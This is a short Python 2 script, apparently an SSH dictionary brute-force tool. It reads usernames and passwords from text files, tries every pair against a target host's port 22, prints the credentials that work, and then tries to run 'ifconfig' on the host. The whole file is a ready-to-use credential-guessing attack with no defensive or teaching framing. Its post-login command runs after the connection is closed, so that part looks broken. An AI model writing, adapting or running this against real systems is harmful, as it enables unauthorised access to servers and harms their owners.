import paramiko,sys,os

from socket import * 

host = raw_input('Enter host to scan: ')
targetIP = gethostbyname(host)

ssh = paramiko.SSHClient()

def ssh_connect(user,password,code=0):
	ssh.load_system_host_keys()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	print("[*] Host: "+targetIP)
	print("[*] Testing user and password from diccionary")
	
	try:
		ssh.connect(targetIP,port=22,username=user,password=password, timeout=5)
	except paramiko.AuthenticationException:
		code = 1
	except Exception,e:
		code = 2

	ssh.close()
	return code

users_file="users.txt"
passwords_file="passwords.txt"

ud=open(users_file,"r")
pd=open(passwords_file,"r")

users= ud.readlines()
passwords=pd.readlines()

for user in users:
	for password in passwords:
		try:	
			response = ssh_connect(user,password)
			if response == 0:
				print("[*] User: %s [*] Pass Found:%s" %(user,password))
				stdin,stdout,stderr = ssh.exec_command("ifconfig")
				for line in stdout.readlines():
					print line.strip()
				#sys.exit(0)
			elif response == 1:
				print("[*] User: %s [*] Pass %s => Login incorrect !!!" %(user,password))
			elif response == 2:
				print("[*] Connection could not be established to %s" %(host))
				#sys.exit(2)
		except Exception,e:
			print e
			pass
			
ud.close()
pd.close()